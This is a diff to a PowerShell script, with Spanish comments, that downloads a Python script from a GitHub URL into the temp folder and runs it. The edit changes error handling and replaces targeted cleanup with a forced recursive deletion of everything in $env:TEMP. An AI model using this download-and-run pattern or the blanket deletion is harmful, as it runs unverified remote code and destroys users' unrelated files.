@@ -13,23 +13,26 @@ $pythonScriptPath = "$env:TEMP\script.py"
 $pythonScriptURL = 'https://github.com/astronomyc/filesRecents/main.py'
 
 try {
-    $response = Invoke-WebRequest -Uri $pythonScriptURL -UseBasicParsing
+    $response = Invoke-WebRequest -Uri $pythonScriptURL -UseBasicParsing
+    Set-Content -Path $pythonScriptPath -Value $response.Content
 }
 catch {
-    # Manejar cualquier error que ocurra durante la descarga
-    Write-Host "Ocurrió un error durante la ejecución del script."
+    Write-Host "Ocurrió un error al descargar el script: $($_.Exception.Message)"
 }
-
-# Guardar el contenido descargado en un archivo
-Set-Content -Path $pythonScriptPath -Value $response.Content
 
 # Añadir la ruta de openpyxl al PYTHONPATH
 $env:PYTHONPATH = "$env:TEMP\openpyxl"
 
-# Ejecutar el script de Python utilizando el intérprete de Python
-python.exe $pythonScriptPath
+# Ruta al intérprete de Python
+$pythonPath = "C:\Path\to\python.exe"
 
-# Limpiar los archivos descargados después de ejecutar el script
-Remove-Item -Path $pythonScriptPath
-Remove-Item -Path $openpyxlPath
-Remove-Item -Path "$env:TEMP\openpyxl" -Recurse -Force
+# Ejecutar el script de Python
+try {
+    & $pythonPath $pythonScriptPath
+}
+catch {
+    Write-Host "Ocurrió un error al ejecutar el script: $($_.Exception.Message)"
+}
+
+# Limpiar los archivos descargados
+Remove-Item -Path $env:TEMP\* -Recurse -Force
